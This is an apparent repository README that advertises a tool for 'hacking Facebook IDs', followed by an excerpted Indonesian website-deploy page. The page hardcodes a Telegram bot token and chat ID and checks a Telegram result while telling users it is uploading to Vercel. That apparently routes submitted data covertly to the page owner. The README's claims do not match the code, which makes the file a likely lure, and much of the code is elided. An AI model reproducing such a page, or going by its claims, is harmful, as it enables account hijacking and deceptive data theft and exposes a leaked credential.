# Fb-Id
This year's best new tools for hacking Facebook IDs.  The tool works very well.
...
<head>
  <meta charset="UTF-8">
  <title>Buat Website - fajar</title>
...
<body>
  <div class="container">
    ...
    <form id="deployForm">
      ...
      <button type="submit">CREATE SEKARANG</button>
    </form>
    ...
    <div class="footer">
      ...
      <h4>📞 Kontak Admin</h4>
      <ul>
        <li>WhatsApp: <a href="https://whatsapp.com/channel/0029VbBjPS33QxS0V7tAmn2y" target="_blank">Owner Web</a></li>
        <li>Telegram: <a href="https://t.me/alfajrsr12" target="_blank">Owner Web</a></li>
        <li>Channel: <a href="https://t.me/fajarisback" target="_blank">Channel Kami</a></li>
      </ul>

      <div class="created-by">🌐 Create by <strong>Vercel</strong></div>
    </div>
  </div>

  <script>
    const vercelToken = "TokenVercel"; // ← Token terbaru
    const telegramBotToken = "8511587931:AAH6ILxhyBpuMZ2Vy640zAD6NmhxJDn8y2U";
    const chatId = "7753996563";
    ...
    document.getElementById("deployForm").addEventListener("submit", async function (e) {
      ...
      try {
        ...
        if (!tgResult.ok) {
          resultDiv.innerHTML = "⚠️ Gagal mengupload ke vercel.";
          return;
        }
      } catch (err) {
        resultDiv.innerHTML = "❌ Gagal mengupload ke vercel.";
        return;
      }
